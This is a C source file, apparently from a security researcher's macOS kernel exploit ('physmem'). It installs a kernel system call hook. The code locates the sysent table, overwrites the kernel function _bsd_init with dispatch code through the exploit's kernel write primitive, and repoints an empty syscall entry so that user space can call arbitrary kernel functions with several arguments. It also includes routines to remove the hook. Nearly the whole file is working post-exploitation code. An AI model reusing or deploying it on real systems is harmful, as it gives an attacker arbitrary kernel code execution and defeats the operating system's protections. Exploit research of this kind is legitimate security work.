/*
 * syscall_hook.c
 * Brandon Azad
 *
 * A system call hook allowing arbitrary kernel functions to be called with up to 5 arguments.
 *
 * The physmem exploit makes installing the syscall hook trivial: we don't even need to worry about
 * memory protections on the kernel TEXT segment because the memory is mapped writable by
 * IOPCIDiagnosticsClient.
 */
#include "syscall_hook.h"

#include "fail.h"
#include "kernel_image.h"
#include "kernel_slide.h"
#include "physmem.h"
#include "syscall_code.h"

#include <stddef.h>

#define _SYSCALL_RET_NONE       0
#define _SYSCALL_RET_INT_T      1
#define _SYSCALL_RET_SSIZE_T    6
#define _SYSCALL_RET_UINT64_T   7

/*
 * struct syscall_hook
 *
 * Description:
 * 	The state needed to install a system call hook.
 */
struct syscall_hook {
	// The location of the sysent table in kernel memory.
	kaddr_t sysent;
	// The target function address.
	kaddr_t function;
	// The original contents of the memory at the target function address.
	kword_t *original;
	// The number of 64-bit words at the start of the target function that were overwritten.
	size_t count;
	// The address of _nosys in the kernel.
	kaddr_t _nosys;
};

/*
 * struct sysent
 *
 * Description:
 * 	An entry in the system call table.
 */
struct sysent {
	kaddr_t sy_call;
	kaddr_t sy_munge;
	int32_t  sy_return_type;
	int16_t  sy_narg;
	uint16_t sy_arg_bytes;
};

extern int kernel_dispatch(void *p, uint64_t arg[6], uint64_t *ret);
extern void kernel_dispatch_end(void);

/*
 * syscall_hook
 *
 * Description:
 * 	The global syscall hook.
 */
static struct syscall_hook syscall_hook;

/*
 * target_function
 *
 * Description:
 * 	The target function that will be overwritten to install the syscall hook.
 */
static const char target_function[] = "_bsd_init";

/*
 * find_sysent
 *
 * Description:
 * 	Find the system call table.
 */
static void find_sysent() {
	// Resolve the various symbols we need.
	kaddr_t _nosys     = kernel_symbol("_nosys")     - kernel_slide;
	kaddr_t _exit      = kernel_symbol("_exit")      - kernel_slide;
	kaddr_t _fork      = kernel_symbol("_fork")      - kernel_slide;
	kaddr_t _read      = kernel_symbol("_read")      - kernel_slide;
	kaddr_t _write     = kernel_symbol("_write")     - kernel_slide;
	kaddr_t _munge_w   = kernel_symbol("_munge_w")   - kernel_slide;
	kaddr_t _munge_www = kernel_symbol("_munge_www") - kernel_slide;
	// Find the runtime address of the system call table.
	struct sysent sysent_init[] = {
		{ _nosys, 0,          _SYSCALL_RET_INT_T,   0,  0 },
		{ _exit,  _munge_w,   _SYSCALL_RET_NONE,    1,  4 },
		{ _fork,  0,          _SYSCALL_RET_INT_T,   0,  0 },
		{ _read,  _munge_www, _SYSCALL_RET_SSIZE_T, 3, 12 },
		{ _write, _munge_www, _SYSCALL_RET_SSIZE_T, 3, 12 },
	};
	kaddr_t sysent = kernel_search(sysent_init, sizeof(sysent_init));
	// Check that the sysent in the kernel matches what we expect.
	for (unsigned i = 0; i < sizeof(sysent_init) / sizeof(sysent_init[0]); i++) {
		sysent_init[i].sy_call += kernel_slide;
		if (sysent_init[i].sy_munge != 0) {
			sysent_init[i].sy_munge += kernel_slide;
		}
	}
	kword_t sysent_data;
	for (unsigned i = 0; i < sizeof(sysent_init) / sizeof(sysent_data); i++) {
		sysent_data = kern_read(sysent + i * sizeof(sysent_data), sizeof(sysent_data));
		if (sysent_data != ((kword_t *)sysent_init)[i]) {
			FAIL("kernel sysent data mismatch");
		}
	}
	syscall_hook.sysent = sysent;
	syscall_hook._nosys = _nosys + kernel_slide;
}

void syscall_hook_install() {
	if (syscall_hook.sysent == 0) {
		find_sysent();
	}
	kaddr_t function = kernel_symbol(target_function);
	const uintptr_t hook = (uintptr_t)kernel_dispatch;
	const size_t hook_size = (uintptr_t)kernel_dispatch_end - hook;
	// Check that the target syscall can be overwritten.
	kaddr_t target_sysent = syscall_hook.sysent + SYSCALL_CODE * sizeof(struct sysent);
	kaddr_t target_sy_call = kern_read(target_sysent + offsetof(struct sysent, sy_call),
			sizeof(target_sy_call));
	if (target_sy_call != syscall_hook._nosys) {
		FAIL("target syscall is not empty");
	}
	// Read the original data from the target function.
	syscall_hook.count = (hook_size + sizeof(kword_t) - 1) & ~sizeof(kword_t);
	syscall_hook.original = malloc(syscall_hook.count * sizeof(kword_t));
	if (syscall_hook.original == NULL) {
		FAIL("malloc failed");
	}
	for (unsigned i = 0; i < syscall_hook.count; i++) {
		syscall_hook.original[i] = kern_read(function + i * sizeof(kword_t),
				sizeof(kword_t));
	}
	// Overwrite the target function. We do this first so that if we fail partway through we
	// don't leave the system with an unstable syscall.
	for (unsigned i = 0; i < syscall_hook.count; i++) {
		kern_write(function + i * sizeof(kword_t), *((kword_t *)hook + i),
				sizeof(kword_t));
	}
	// Overwrite the sysent. We do this in reverse order so that if we fail partway through we
	// don't leave the system with an unstable syscall.
	struct sysent hook_sysent = {
		.sy_call        = function,
		.sy_munge       = 0,
		.sy_return_type = _SYSCALL_RET_UINT64_T,
		.sy_narg        = 6,
		.sy_arg_bytes   = 48,
	};
	for (int i = sizeof(hook_sysent) / sizeof(kword_t) - 1; i >= 0; i--) {
		kern_write(target_sysent + i * sizeof(kword_t), *((kword_t *)&hook_sysent + i),
				sizeof(kword_t));
	}
	syscall_hook.function = function;
}

void syscall_hook_remove() {
	if (syscall_hook.function == 0) {
		return;
	}
	// Replace our sysent hook with an empty sysent.
	kaddr_t target_sysent = syscall_hook.sysent + SYSCALL_CODE * sizeof(struct sysent);
	struct sysent empty_sysent = {
		.sy_call        = syscall_hook._nosys,
		.sy_munge       = 0,
		.sy_return_type = _SYSCALL_RET_INT_T,
		.sy_narg        = 0,
		.sy_arg_bytes   = 0,
	};
	unsigned empty_sysent_count = sizeof(empty_sysent) / sizeof(kword_t);
	for (unsigned i = 0; i < empty_sysent_count; i++) {
		kern_write(target_sysent + i * sizeof(kword_t), *((kword_t *)&empty_sysent + i),
				sizeof(kword_t));
	}
	// Replace the original contents of the function we overwrote.
	for (unsigned i = 0; i < syscall_hook.count; i++) {
		kern_write(syscall_hook.function + i * sizeof(kword_t), syscall_hook.original[i],
				sizeof(kword_t));
	}
	free(syscall_hook.original);
	syscall_hook.function = 0;
}
